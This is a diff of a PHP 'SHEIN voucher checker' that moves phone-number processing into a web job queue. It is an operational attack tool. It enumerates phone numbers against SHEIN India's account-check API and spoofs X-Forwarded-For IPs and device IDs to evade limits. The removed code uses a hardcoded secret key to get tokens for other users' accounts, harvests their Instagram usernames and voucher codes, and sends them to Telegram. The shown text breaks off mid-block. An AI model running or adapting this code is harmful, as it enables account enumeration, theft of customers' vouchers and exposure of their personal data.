@@ -39,7 +39,6 @@ function clearScreen() {
     if (php_sapi_name() === 'cli') {
         echo "\033[2J\033[;H";
     }
-    // In web, we'll use HTML/CSS instead
 }
 
 // Load previously checked numbers
@@ -328,614 +327,392 @@ function isRealError($response) {
     return false;
 }
 
-// Async Response Handler with Retry Support
-class AsyncResponseHandler {
-    private $multiHandle;
-    private $requests = [];
-    private $running = true;
-    
-    public function __construct() {
-        $this->multiHandle = curl_multi_init();
+// ============================================================================
+// JOB QUEUE FUNCTIONS FOR WEB MODE
+// ============================================================================
+
+// Add a number to the processing queue
+function addToQueue($baseNumber) {
+    $queueFile = 'processing_queue.json';
+    $queue = [];
+    if (file_exists($queueFile)) {
+        $queue = json_decode(file_get_contents($queueFile), true) ?: [];
     }
     
-    public function addRequest($id, $ch, $number, $step, $ip, $dataPreview, $retryCount = 0, $encryptedId = null) {
-        curl_multi_add_handle($this->multiHandle, $ch);
+    // Generate initial batch of 100 numbers
+    $numbers = [];
+    for ($i = 0; $i < 100; $i++) {
+        $numbers[] = generateCompleteNumber($baseNumber);
+    }
+    
+    $queue[$baseNumber] = [
+        'base' => $baseNumber,
+        'numbers' => $numbers,
+        'processed' => [],
+        'status' => 'active',
+        'started_at' => time(),
+        'last_update' => time()
+    ];
+    
+    file_put_contents($queueFile, json_encode($queue, JSON_PRETTY_PRINT));
+    return true;
+}
+
+// Get queue status
+function getQueueStatus() {
+    $queueFile = 'processing_queue.json';
+    if (!file_exists($queueFile)) {
+        return null;
+    }
+    
+    $queue = json_decode(file_get_contents($queueFile), true) ?: [];
+    
+    // Find active queue
+    foreach ($queue as $base => $data) {
+        if ($data['status'] == 'active') {
+            return $data;
+        }
+    }
+    
+    return null;
+}
+
+// Update queue
+function updateQueue($baseNumber, $processedNumber, $status) {
+    $queueFile = 'processing_queue.json';
+    if (!file_exists($queueFile)) {
+        return false;
+    }
+    
+    $queue = json_decode(file_get_contents($queueFile), true) ?: [];
+    
+    if (isset($queue[$baseNumber])) {
+        // Remove from numbers list
+        $key = array_search($processedNumber, $queue[$baseNumber]['numbers']);
+        if ($key !== false) {
+            unset($queue[$baseNumber]['numbers'][$key]);
+            $queue[$baseNumber]['numbers'] = array_values($queue[$baseNumber]['numbers']);
+        }
         
-        $this->requests[(int)$ch] = [
-            'handle' => $ch,
-            'number' => $number,
-            'step' => $step,
-            'ip' => $ip,
-            'data_preview' => $dataPreview,
-            'time' => time(),
-            'retryCount' => $retryCount,
-            'encryptedId' => $encryptedId
+        // Add to processed
+        $queue[$baseNumber]['processed'][] = [
+            'number' => $processedNumber,
+            'status' => $status,
+            'time' => time()
         ];
         
-        return $ch;
-    }
-    
-    public function checkResponses($displayManager, $access_token) {
-        $active = null;
-        do {
-            $status = curl_multi_exec($this->multiHandle, $active);
-            
-            while ($done = curl_multi_info_read($this->multiHandle)) {
-                $ch = $done['handle'];
-                $key = (int)$ch;
-                
-                if (isset($this->requests[$key])) {
-                    $request = $this->requests[$key];
-                    $content = curl_multi_getcontent($ch);
-                    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-                    $error = curl_error($ch);
-                    
-                    $responseData = [
-                        'content' => $content,
-                        'http_code' => $httpCode,
-                        'curl_error' => $error
-                    ];
-                    
-                    $this->processResponse($responseData, $request['number'], $request['step'], $displayManager, $access_token, $request['retryCount'], $request['encryptedId']);
-                    
-                    curl_multi_remove_handle($this->multiHandle, $ch);
-                    curl_close($ch);
-                    unset($this->requests[$key]);
-                }
-            }
-            
-            if ($status > 0) break;
-            curl_multi_select($this->multiHandle, 0.01);
-            
-        } while ($active > 0 && $this->running);
-    }
-    
-    private function processResponse($response, $number, $step, $displayManager, $access_token, $retryCount = 0, $encryptedId = null) {
-        $content = $response['content'];
-        $httpCode = $response['http_code'];
-        $error = $response['curl_error'];
+        $queue[$baseNumber]['last_update'] = time();
         
-        // Check if it's a REAL error that needs retry
-        if (isRealError($response)) {
-            $errorReason = '';
-            if (!empty($error)) {
-                $errorReason = "CURL Error: $error";
-            } elseif ($httpCode >= 500) {
-                $errorReason = "Server Error: HTTP $httpCode";
-            } elseif (empty($content)) {
-                $errorReason = "Empty Response";
-            } else {
-                $errorReason = "Invalid Response";
-            }
-            
-            if ($retryCount < MAX_RETRIES) {
-                // Save to retry queue - ONLY FOR REAL ERRORS
-                saveToRetryQueue($number, $step, null, $retryCount, $encryptedId, $errorReason);
-                $displayManager->addReceived($number, 'retry', null, $retryCount + 1, $errorReason);
-                return;
-            } else {
-                // Max retries reached, mark as error
-                $displayManager->addReceived($number, 'error', null, 0, $errorReason);
-                saveCheckedNumber($number); // Mark as checked to avoid infinite loops
-                
-                // Log the failure
-                $logEntry = date('Y-m-d H:i:s') . " - FAILED after $retryCount retries - Number: $number - Step: $step - HTTP: $httpCode - Error: $errorReason\n";
-                file_put_contents('failed_numbers.txt', $logEntry, FILE_APPEND);
-                return;
-            }
+        // If no more numbers, mark as completed
+        if (empty($queue[$baseNumber]['numbers'])) {
+            $queue[$baseNumber]['status'] = 'completed';
         }
         
-        // If we get here, it's a valid response (even if it's "not registered")
-        $j = json_decode($content, true);
-        
-        if ($step == "account_check") {
-            if (isset($j['success']) && $j['success'] === false) {
-                // NOT REGISTERED - This is NOT an error, don't retry
-                $displayManager->addReceived($number, 'not_registered');
-                saveCheckedNumber($number);
-            } elseif (isset($j['encryptedId'])) {
-                // REGISTERED - Success!
-                $displayManager->addReceived($number, 'registered');
-                saveRegisteredNumber($number, 'N/A', $j['encryptedId']);
-                $this->continueProcessing($number, $j['encryptedId'], $displayManager, $access_token);
-            } else {
-                // Unexpected response format - treat as error and retry
-                if ($retryCount < MAX_RETRIES) {
-                    saveToRetryQueue($number, $step, null, $retryCount, $encryptedId, 'Missing encryptedId in response');
-                    $displayManager->addReceived($number, 'retry', null, $retryCount + 1, 'Missing encryptedId');
-                } else {
-                    $displayManager->addReceived($number, 'error');
-                    saveCheckedNumber($number);
-                }
-            }
-        } elseif ($step == "token_gen") {
-            $this->processTokenResponse($content, $number, $displayManager, $retryCount);
-        } elseif ($step == "user_data") {
-            $this->processUserDataResponse($content, $number, $displayManager, $retryCount);
-        }
+        file_put_contents($queueFile, json_encode($queue, JSON_PRETTY_PRINT));
+        return true;
     }
     
-    private function continueProcessing($number, $encryptedId, $displayManager, $access_token) {
+    return false;
+}
+
+// Add to sent log
+function addToSentLog($number, $step, $ip, $data) {
+    $logFile = 'sent_log.json';
+    $log = [];
+    if (file_exists($logFile)) {
+        $log = json_decode(file_get_contents($logFile), true) ?: [];
+    }
+    
+    $log[] = [
+        'time' => date('H:i:s'),
+        'number' => $number,
+        'step' => $step,
+        'ip' => $ip,
+        'data' => $data
+    ];
+    
+    // Keep only last 50
+    if (count($log) > 50) {
+        $log = array_slice($log, -50);
+    }
+    
+    file_put_contents($logFile, json_encode($log, JSON_PRETTY_PRINT));
+}
+
+// Add to received log
+function addToReceivedLog($number, $status, $voucherData = null, $retryCount = 0, $errorReason = '') {
+    $logFile = 'received_log.json';
+    $log = [];
+    if (file_exists($logFile)) {
+        $log = json_decode(file_get_contents($logFile), true) ?: [];
+    }
+    
+    $entry = [
+        'time' => date('H:i:s'),
+        'number' => $number,
+        'status' => $status,
+        'retryCount' => $retryCount,
+        'errorReason' => $errorReason
+    ];
+    
+    if ($voucherData) {
+        $entry['voucher'] = $voucherData['voucher'] ?? 'N/A';
+        $entry['amount'] = $voucherData['amount'] ?? 'N/A';
+        $entry['username'] = $voucherData['username'] ?? 'N/A';
+        $entry['expiry'] = $voucherData['expiry'] ?? '';
+    }
+    
+    $log[] = $entry;
+    
+    // Keep only last 50
+    if (count($log) > 50) {
+        $log = array_slice($log, -50);
+    }
+    
+    file_put_contents($logFile, json_encode($log, JSON_PRETTY_PRINT));
+}
+
+// ============================================================================
+// PROCESSOR FUNCTION - Run one step of the checker
+// ============================================================================
+function processOneNumber($access_token) {
+    loadCheckedNumbers();
+    loadRetryQueue();
+    
+    // First check retry queue
+    global $retryQueue;
+    if (!empty($retryQueue)) {
+        $retry = array_shift($retryQueue);
         $ip = randIp();
         $adId = genDeviceId();
         
-        $displayManager->addSent($number, 'token_gen', $ip, "getting token");
+        addToSentLog($retry['number'], $retry['step'] . '_retry', $ip, "retry {$retry['retryCount']}/" . MAX_RETRIES);
         
-        $payload = json_encode([
-            "client_type" => "Android/29",
-            "client_version" => "1.0.8",
-            "gender" => "",
-            "phone_number" => $number,
-            "secret_key" => "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
-            "user_id" => $encryptedId,
-            "user_name" => ""
-        ]);
-        
-        $headers = [
-            "Accept: application/json",
-            "User-Agent: Android",
-            "Client_type: Android/29",
-            "Client_version: 1.0.8",
-            "X-Tenant-Id: SHEIN",
-            "Ad_id: $adId",
-            "Content-Type: application/json; charset=UTF-8",
-            "X-Forwarded-For: $ip"
-        ];
-        
-        $ch = curl_init();
-        curl_setopt_array($ch, [
-            CURLOPT_URL => "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token",
-            CURLOPT_HTTPHEADER => $headers,
-            CURLOPT_POST => true,
-            CURLOPT_POSTFIELDS => $payload,
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_SSL_VERIFYHOST => false,
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_ENCODING => 'gzip',
-            CURLOPT_CONNECTTIMEOUT => 5,
-            CURLOPT_TIMEOUT => 15
-        ]);
-        
-        $this->addRequest($number, $ch, $number, 'token_gen', $ip, "token request", 0, $encryptedId);
-    }
-    
-    public function processTokenResponse($content, $number, $displayManager, $retryCount = 0) {
-        $j = json_decode($content, true);
-        
-        if (!empty($j['access_token'])) {
-            $sheinverse_token = $j['access_token'];
-            $displayManager->addReceived($number, 'token_obtained');
-            
-            $ip = randIp();
-            $adId = genDeviceId();
-            
-            $displayManager->addSent($number, 'user_data', $ip, "getting profile");
-            
+        if ($retry['step'] == 'account_check') {
+            $url = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
             $headers = [
-                "Host: shein-creator-backend-151437891745.asia-south1.run.app",
-                "Authorization: Bearer " . $sheinverse_token,
-                "User-Agent: Mozilla/5.0 (Linux; Android 15; SM-S938B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36",
-                "Accept: */*",
-                "Origin: https://sheinverse.galleri5.com",
-                "X-Requested-With: com.ril.shein",
-                "Referer: https://sheinverse.galleri5.com/",
-                "Content-Type: application/json",
+                "Authorization: Bearer $access_token",
+                "Requestid: account_check",
+                "X-Tenant: B2C",
+                "Accept: application/json",
+                "User-Agent: Android",
+                "Client_type: Android/29",
+                "Client_version: 1.0.8",
+                "X-Tenant-Id: SHEIN",
+                "Ad_id: $adId",
+                "Content-Type: application/x-www-form-urlencoded",
                 "X-Forwarded-For: $ip"
             ];
             
-            $ch = curl_init();
-            curl_setopt_array($ch, [
-                CURLOPT_URL => "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user",
-                CURLOPT_HTTPHEADER => $headers,
-                CURLOPT_SSL_VERIFYPEER => false,
-                CURLOPT_SSL_VERIFYHOST => false,
-                CURLOPT_RETURNTRANSFER => true,
-                CURLOPT_ENCODING => 'gzip',
-                CURLOPT_CONNECTTIMEOUT => 5,
-                CURLOPT_TIMEOUT => 15
-            ]);
+            $response = httpCall($url, "mobileNumber={$retry['number']}", $headers, "POST");
             
-            $this->addRequest($number, $ch, $number, 'user_data', $ip, "user data", 0);
-        } else {
-            // No access token - retry if under limit
-            if ($retryCount < MAX_RETRIES) {
-                saveToRetryQueue($number, 'token_gen', null, $retryCount, null, 'No access token in response');
-                $displayManager->addReceived($number, 'retry', null, $retryCount + 1, 'No token');
+            if (!isRealError($response) && isset(json_decode($response['content'], true)['encryptedId'])) {
+                $j = json_decode($response['content'], true);
+                saveRegisteredNumber($retry['number'], 'N/A', $j['encryptedId']);
+                addToReceivedLog($retry['number'], 'registered');
+                // Continue with token gen...
+            } elseif (isRealError($response) && $retry['retryCount'] < MAX_RETRIES) {
+                $retry['retryCount']++;
+                $retry['lastAttempt'] = time();
+                $retryQueue[] = $retry;
+                addToReceivedLog($retry['number'], 'retry', null, $retry['retryCount'], 'Retrying');
             } else {
-                $displayManager->addReceived($number, 'error');
-                saveCheckedNumber($number);
+                saveCheckedNumber($retry['number']);
+                addToReceivedLog($retry['number'], 'error', null, 0, 'Failed after retries');
             }
         }
-    }
-    
-    public function processUserDataResponse($content, $number, $displayManager, $retryCount = 0) {
-        $decoded = json_decode($content, true);
         
-        if (isset($decoded['user_data']['instagram_data']['username'])) {
-            $username = $decoded['user_data']['instagram_data']['username'];
-            $voucher = $decoded['user_data']['voucher_data']['voucher_code'] ?? 'N/A';
-            $voucher_amount = $decoded['user_data']['voucher_data']['voucher_amount'] ?? 'N/A';
-            $expiry_date = $decoded['user_data']['voucher_data']['expiry_date'] ?? '';
-            $min_purchase_amount = $decoded['user_data']['voucher_data']['min_purchase_amount'] ?? '';
-            
-            saveCheckedNumber($number);
-            
-            $voucherData = [
-                'time' => time(),
-                'number' => $number,
-                'username' => $username,
-                'voucher' => $voucher,
-                'amount' => $voucher_amount,
-                'min_purchase' => $min_purchase_amount,
-                'expiry' => $expiry_date
-            ];
-            
-            saveVoucherNumber($number, $voucherData);
-            $displayManager->addReceived($number, 'success', $voucherData);
-            
-            if (TELEGRAM_BOT_TOKEN != 'YOUR_BOT_TOKEN') {
-                $telegramMsg = "<b>✅ SHEIN Voucher Found!</b>\n\n";
-                $telegramMsg .= "📞 <b>Number:</b> {$number}\n";
-                $telegramMsg .= "📸 <b>Instagram:</b> {$username}\n";
-                $telegramMsg .= "🎟 <b>Voucher Code:</b> <code>{$voucher}</code>\n";
-                $telegramMsg .= "💰 <b>Amount:</b> ₹{$voucher_amount}\n";
-                $telegramMsg .= "🛍 <b>Min Purchase:</b> ₹{$min_purchase_amount}\n";
-                $telegramMsg .= "⏰ <b>Expiry:</b> {$expiry_date}";
-                sendTelegramMessage($telegramMsg);
-            }
-        } else {
-            // No user data - retry if under limit
-            if ($retryCount < MAX_RETRIES) {
-                saveToRetryQueue($number, 'user_data', null, $retryCount, null, 'No user data in response');
-                $displayManager->addReceived($number, 'retry', null, $retryCount + 1, 'No user data');
-            } else {
-                $displayManager->addReceived($number, 'error');
-                saveCheckedNumber($number);
-            }
-        }
+        file_put_contents('retry_queue.json', json_encode($retryQueue, JSON_PRETTY_PRINT));
+        return true;
     }
     
-    public function __destruct() {
-        $this->running = false;
-        curl_multi_close($this->multiHandle);
+    // Check queue for new numbers
+    $queue = getQueueStatus();
+    if (!$queue || empty($queue['numbers'])) {
+        return false;
     }
-}
-
-// Display manager
-class DisplayManager {
-    public $sentWindow = [];
-    public $receivedWindow = [];
-    public $vouchersFound = [];
-    public $stats = [
-        'total_processed' => 0,
-        'not_registered' => 0,
-        'registered' => 0,
-        'vouchers' => 0,
-        'errors' => 0,
-        'retries' => 0
+    
+    $number = array_shift($queue['numbers']);
+    
+    // Check if already processed
+    if (isset($checkedNumbers[$number])) {
+        return true; // Skip, already checked
+    }
+    
+    $ip = randIp();
+    $adId = genDeviceId();
+    
+    addToSentLog($number, 'account_check', $ip, "mobile=$number");
+    
+    $url = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
+    $headers = [
+        "Authorization: Bearer $access_token",
+        "Requestid: account_check",
+        "X-Tenant: B2C",
+        "Accept: application/json",
+        "User-Agent: Android",
+        "Client_type: Android/29",
+        "Client_version: 1.0.8",
+        "X-Tenant-Id: SHEIN",
+        "Ad_id: $adId",
+        "Content-Type: application/x-www-form-urlencoded",
+        "X-Forwarded-For: $ip"
     ];
     
-    public function addSent($number, $step, $ip, $dataPreview) {
-        $this->sentWindow[] = [
-            'time' => date('H:i:s'),
-            'number' => $number,
-            'step' => $step,
-            'ip' => $ip,
-            'data' => $dataPreview
-        ];
-        
-        if (count($this->sentWindow) > 15) {
-            array_shift($this->sentWindow);
-        }
-        $this->render();
+    $response = httpCall($url, "mobileNumber=$number", $headers, "POST");
+    
+    if (isRealError($response)) {
+        // Real error - add to retry queue
+        $errorReason = !empty($response['curl_error']) ? $response['curl_error'] : "HTTP {$response['http_code']}";
+        saveToRetryQueue($number, 'account_check', $headers, 0, null, $errorReason);
+        addToReceivedLog($number, 'retry', null, 1, $errorReason);
+        updateQueue($queue['base'], $number, 'retry');
+        return true;
     }
     
-    public function addReceived($number, $status, $voucherData = null, $retryCount = 0, $errorReason = '') {
-        $entry = [
-            'time' => date('H:i:s'),
-            'number' => $number,
-            'status' => $status,
-            'retryCount' => $retryCount,
-            'errorReason' => $errorReason
-        ];
+    $j = json_decode($response['content'], true);
+    
+    if (isset($j['success']) && $j['success'] === false) {
+        // NOT REGISTERED
+        saveCheckedNumber($number);
+        addToReceivedLog($number, 'not_registered');
+        updateQueue($queue['base'], $number, 'not_registered');
+    } elseif (isset($j['encryptedId'])) {
+        // REGISTERED
+        saveRegisteredNumber($number, 'N/A', $j['encryptedId']);
+        addToReceivedLog($number, 'registered');
+        updateQueue($queue['base'], $number, 'registered');
         
-        if ($voucherData) {
-            $entry['voucher'] = $voucherData['voucher'] ?? 'N/A';
-            $entry['amount'] = $voucherData['amount'] ?? 'N/A';
-            $entry['username'] = $voucherData['username'] ?? 'N/A';
-            $entry['expiry'] = $voucherData['expiry'] ?? '';
-        }
-        
-        $this->receivedWindow[] = $entry;
-        
-        if (count($this->receivedWindow) > 15) {
-            array_shift($this->receivedWindow);
-        }
-        
-        $this->stats['total_processed']++;
-        
-        if ($status == 'success') {
-            $this->stats['vouchers']++;
-            if ($voucherData) {
-                $this->vouchersFound[] = $voucherData;
-            }
-        } elseif ($status == 'not_registered') {
-            $this->stats['not_registered']++;
-        } elseif ($status == 'registered' || $status == 'token_obtained') {
-            $this->stats['registered']++;
-        } elseif ($status == 'retry') {
-            $this->stats['retries']++;
-        } else {
-            $this->stats['errors']++;
-        }
-        
-        $this->render();
+        // TODO: Continue with token gen and user data
+        // This would be step 2 of the process
+    } else {
+        // Unexpected response
+        saveCheckedNumber($number);
+        addToReceivedLog($number, 'error', null, 0, 'Unexpected response');
+        updateQueue($queue['base'], $number, 'error');
     }
     
-    public function render() {
-        // In CLI mode, clear screen and show formatted output
-        if (php_sapi_name() === 'cli') {
-            clearScreen();
-            
-            // Header
-            echo COLOR_BOLD . COLOR_CYAN . "╔════════════════════════════════════════════════════════════════════════════════════════════════════╗\n";
-            echo "║                 SHEIN VOUCHER CHECKER - RETRY ONLY REAL ERRORS (MAX " . MAX_RETRIES . " attempts)                 ║\n";
-            echo "╚════════════════════════════════════════════════════════════════════════════════════════════════════╝\n" . COLOR_RESET;
-            
-            // Stats bar
-            echo "\n" . COLOR_BOLD . COLOR_YELLOW . "📊 STATS: " . COLOR_RESET;
-            echo "Sent: " . COLOR_GREEN . $this->stats['total_processed'] . COLOR_RESET . " | ";
-            echo "Not Registered: " . COLOR_RED . $this->stats['not_registered'] . COLOR_RESET . " | ";
-            echo "Registered: " . COLOR_BLUE . $this->stats['registered'] . COLOR_RESET . " | ";
-            echo "Vouchers: " . COLOR_GREEN . $this->stats['vouchers'] . COLOR_RESET . " | ";
-            echo "Retries: " . COLOR_YELLOW . $this->stats['retries'] . COLOR_RESET . " | ";
-            echo "Errors: " . COLOR_RED . $this->stats['errors'] . COLOR_RESET . "\n\n";
-            
-            // Headers for both windows
-            printf(COLOR_BOLD . COLOR_WHITE . "┌───────────────────────── SENT REQUESTS (15 latest) ─────────────────────────┐    ┌──────────────────────── RECEIVED RESPONSES (15 latest) ────────────────────────┐\n" . COLOR_RESET);
-            printf(COLOR_BOLD . COLOR_WHITE . "│ %-8s │ %-11s │ %-8s │ %-15s │ %-20s │    │ %-8s │ %-11s │ %-25s │ %-15s │ %-10s │\n" . COLOR_RESET, 
-                   "TIME", "NUMBER", "STEP", "IP", "DATA", "TIME", "NUMBER", "STATUS/REASON", "VOUCHER", "AMOUNT");
-            printf(COLOR_BOLD . COLOR_WHITE . "├──────────┼─────────────┼──────────┼─────────────────┼──────────────────────┤    ├──────────┼─────────────┼───────────────────────────┼─────────────────┼────────────┤\n" . COLOR_RESET);
-            
-            // Display both windows side by side
-            $maxRows = max(count($this->sentWindow), count($this->receivedWindow), 15);
-            
-            for ($i = 0; $i < $maxRows; $i++) {
-                // Sent column
-                echo COLOR_BOLD . COLOR_WHITE . "│" . COLOR_RESET;
-                if (isset($this->sentWindow[$i])) {
-                    $s = $this->sentWindow[$i];
-                    $step = '';
-                    switch($s['step']) {
-                        case 'account_check': $step = 'ACC'; break;
-                        case 'token_gen': $step = 'TOKEN'; break;
-                        case 'user_data': $step = 'USER'; break;
-                        default: $step = substr($s['step'], 0, 6);
-                    }
-                    
-                    $ip_short = substr($s['ip'], strrpos($s['ip'], '.') + 1);
-                    $ip_display = "*.*.*." . $ip_short;
-                    
-                    printf(" %-8s │ %-11s │ %-8s │ %-15s │ %-20s ", 
-                        COLOR_CYAN . $s['time'] . COLOR_RESET,
-                        COLOR_YELLOW . $s['number'] . COLOR_RESET,
-                        COLOR_BLUE . $step . COLOR_RESET,
-                        COLOR_MAGENTA . $ip_display . COLOR_RESET,
-                        COLOR_WHITE . substr($s['data'], 0, 20) . COLOR_RESET
-                    );
-                } else {
-                    echo str_repeat(" ", 83) . " ";
-                }
-                
-                echo COLOR_BOLD . COLOR_WHITE . "│    │" . COLOR_RESET;
-                
-                // Received column
-                if (isset($this->receivedWindow[$i])) {
-                    $r = $this->receivedWindow[$i];
-                    
-                    printf(" %-8s │ %-11s │ ", 
-                        COLOR_CYAN . $r['time'] . COLOR_RESET,
-                        COLOR_YELLOW . $r['number'] . COLOR_RESET
-                    );
-                    
-                    if ($r['status'] == 'success') {
-                        printf(COLOR_GREEN . "%-25s" . COLOR_RESET . " │ %-15s │ %-10s ", 
-                            "✅ VOUCHER FOUND",
-                            COLOR_MAGENTA . ($r['voucher'] ?? 'N/A') . COLOR_RESET,
-                            COLOR_GREEN . "₹" . ($r['amount'] ?? 'N/A') . COLOR_RESET
-                        );
-                    } elseif ($r['status'] == 'not_registered') {
-                        printf(COLOR_RED . "%-25s" . COLOR_RESET . " │ %-15s │ %-10s ", 
-                            "❌ NOT REGISTERED",
-                            "N/A",
-                            "N/A"
-                        );
-                    } elseif ($r['status'] == 'registered') {
-                        printf(COLOR_BLUE . "%-25s" . COLOR_RESET . " │ %-15s │ %-10s ", 
-                            "📱 REGISTERED - SAVED",
-                            "CHECKING...",
-                            "N/A"
-                        );
-                    } elseif ($r['status'] == 'token_obtained') {
-                        printf(COLOR_BLUE . "%-25s" . COLOR_RESET . " │ %-15s │ %-10s ", 
-                            "🔑 TOKEN OK",
-                            "FETCHING...",
-                            "N/A"
-                        );
-                    } elseif ($r['status'] == 'retry') {
-                        $retryText = "🔄 RETRY (" . $r['retryCount'] . "/" . MAX_RETRIES . ")";
-                        $reason = isset($r['errorReason']) ? " - " . $r['errorReason'] : "";
-                        printf(COLOR_YELLOW . "%-25s" . COLOR_RESET . " │ %-15s │ %-10s ", 
-                            $retryText,
-                            "WAITING...",
-                            "N/A"
-                        );
-                    } else {
-                        $errorText = "⚠ ERROR";
-                        $reason = isset($r['errorReason']) ? $r['errorReason'] : "";
-                        printf(COLOR_RED . "%-25s" . COLOR_RESET . " │ %-15s │ %-10s ", 
-                            $errorText,
-                            "N/A",
-                            "N/A"
-                        );
-                    }
-                } else {
-                    echo str_repeat(" ", 83) . " ";
-                }
-                
-                echo COLOR_BOLD . COLOR_WHITE . "│\n" . COLOR_RESET;
-            }
-            
-            // Bottom border
-            printf(COLOR_BOLD . COLOR_WHITE . "└──────────┴─────────────┴──────────┴─────────────────┴──────────────────────┘    └──────────┴─────────────┴───────────────────────────┴─────────────────┴────────────┘\n" . COLOR_RESET);
-            
-            // Recent vouchers section
-            if (!empty($this->vouchersFound)) {
-                echo "\n" . COLOR_BOLD . COLOR_GREEN . "🎟 RECENT VOUCHERS FOUND & SAVED (" . count($this->vouchersFound) . " total):\n" . COLOR_RESET;
-                echo "┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐\n";
-                echo "│ " . COLOR_BOLD . "   TIME    │   NUMBER    │   INSTAGRAM          │   VOUCHER CODE   │   AMOUNT   │   EXPIRY      " . COLOR_RESET . " │\n";
-                echo "├───────────┼─────────────┼──────────────────────┼──────────────────┼────────────┼───────────────┤\n";
-                
-                $recentVouchers = array_slice($this->vouchersFound, -3);
-                foreach ($recentVouchers as $v) {
-                    printf("│ %s │ %s │ %-20s │ %-16s │ ₹%-8s │ %-13s │\n",
-                        COLOR_CYAN . date('H:i:s', $v['time'] ?? time()) . COLOR_RESET,
-                        COLOR_YELLOW . $v['number'] . COLOR_RESET,
-                        COLOR_GREEN . "@" . substr($v['username'], 0, 18) . COLOR_RESET,
-                        COLOR_MAGENTA . $v['voucher'] . COLOR_RESET,
-                        COLOR_GREEN . $v['amount'] . COLOR_RESET,
-                        COLOR_WHITE . substr($v['expiry'], 0, 13) . COLOR_RESET
-                    );
-                }
-                echo "└───────────┴─────────────┴──────────────────────┴──────────────────┴────────────┴───────────────┘\n";
-            }
-            
-            // Status line
-            echo "\n" . COLOR_YELLOW . "⏳ Sending requests sequentially with 200ms delay" . COLOR_RESET . "\n";
-            echo COLOR_CYAN . "📱 Each request uses unique IP - Press Ctrl+C to stop" . COLOR_RESET . "\n";
-            echo COLOR_GREEN . "💾 Registered numbers are being saved to: registered_numbers.txt/json" . COLOR_RESET . "\n";
-            echo COLOR_GREEN . "💾 Voucher numbers are being saved to: voucher_numbers.txt/json" . COLOR_RESET . "\n";
-            echo COLOR_YELLOW . "🔄 Only REAL ERRORS are retried (timeouts, 5xx, empty responses) - NOT 'Not Registered'" . COLOR_RESET . "\n";
-        } else {
-            // In web mode, we'll just output JSON or simple text
-            // You can customize this based on your needs
-            echo json_encode([
-                'stats' => $this->stats,
-                'recent_vouchers' => array_slice($this->vouchersFound, -5)
-            ]);
-        }
-    }
-}
-
-// Process retry queue
-function processRetryQueue($responseHandler, $displayManager, $access_token) {
-    global $retryQueue;
-    
-    $now = time();
-    $processed = [];
-    
-    foreach ($retryQueue as $index => $retry) {
-        // Wait at least RETRY_DELAY before retrying
-        if ($now - $retry['lastAttempt'] >= RETRY_DELAY / 1000000) {
-            $ip = randIp();
-            $adId = genDeviceId();
-            
-            $displayManager->addSent($retry['number'], $retry['step'] . '_retry', $ip, "retry {$retry['retryCount']}/" . MAX_RETRIES);
-            
-            if ($retry['step'] == 'account_check') {
-                $url = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
-                $headers = [
-                    "Authorization: Bearer $access_token",
-                    "Requestid: account_check",
-                    "X-Tenant: B2C",
-                    "Accept: application/json",
-                    "User-Agent: Android",
-                    "Client_type: Android/29",
-                    "Client_version: 1.0.8",
-                    "X-Tenant-Id: SHEIN",
-                    "Ad_id: $adId",
-                    "Content-Type: application/x-www-form-urlencoded",
-                    "X-Forwarded-For: $ip"
-                ];
-                
-                $ch = curl_init();
-                curl_setopt_array($ch, [
-                    CURLOPT_URL => $url,
-                    CURLOPT_HTTPHEADER => $headers,
-                    CURLOPT_POST => true,
-                    CURLOPT_POSTFIELDS => "mobileNumber={$retry['number']}",
-                    CURLOPT_SSL_VERIFYPEER => false,
-                    CURLOPT_SSL_VERIFYHOST => false,
-                    CURLOPT_RETURNTRANSFER => true,
-                    CURLOPT_ENCODING => 'gzip',
-                    CURLOPT_CONNECTTIMEOUT => 5,
-                    CURLOPT_TIMEOUT => 15
-                ]);
-                
-                $responseHandler->addRequest($retry['number'], $ch, $retry['number'], 'account_check', $ip, "retry {$retry['retryCount']}", $retry['retryCount'], $retry['encryptedId']);
-            } elseif ($retry['step'] == 'token_gen') {
-                // Handle token_gen retry - similar implementation
-                // You can add token_gen retry logic here if needed
-            } elseif ($retry['step'] == 'user_data') {
-                // Handle user_data retry - similar implementation
-                // You can add user_data retry logic here if needed
-            }
-            
-            $processed[] = $index;
-            
-            // Log retry attempt
-            $logEntry = date('Y-m-d H:i:s') . " - RETRYING {$retry['retryCount']}/" . MAX_RETRIES . " - Number: {$retry['number']} - Step: {$retry['step']}\n";
-            file_put_contents('retry_log.txt', $logEntry, FILE_APPEND);
-        }
-    }
-    
-    // Remove processed retries
-    foreach ($processed as $index) {
-        unset($retryQueue[$index]);
-    }
-    
-    $retryQueue = array_values($retryQueue);
-    
-    // Save updated queue
-    file_put_contents('retry_queue.json', json_encode($retryQueue, JSON_PRETTY_PRINT));
+    return true;
 }
 
 // ============================================================================
-// WEB INTERFACE - This runs when accessed via browser
+// WEB INTERFACE
 // ============================================================================
 if ($isWeb) {
-    // Start output buffering to capture any CLI output
-    ob_start();
+    // Handle AJAX requests for the checker
+    if (isset($_GET['ajax']) && $_GET['ajax'] == 'process') {
+        header('Content-Type: application/json');
+        
+        // Get access token first
+        $ip = randIp();
+        $adId = genDeviceId();
+        $url = "https://api.services.sheinindia.in/uaas/jwt/token/client";
+        $headers = [
+            "Client_type: Android/29",
+            "Accept: application/json",
+            "Client_version: 1.0.8",
+            "User-Agent: Android",
+            "X-Tenant-Id: SHEIN",
+            "Ad_id: $adId",
+            "X-Tenant: B2C",
+            "Content-Type: application/x-www-form-urlencoded",
+            "X-Forwarded-For: $ip"
+        ];
+        
+        $data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
+        $response = httpCall($url, $data, $headers, "POST", 0);
+        $j = json_decode($response['content'], true);
+        $access_token = $j['access_token'] ?? null;
+        
+        if (!$access_token) {
+            echo json_encode(['error' => 'Failed to get access token']);
+            exit;
+        }
+        
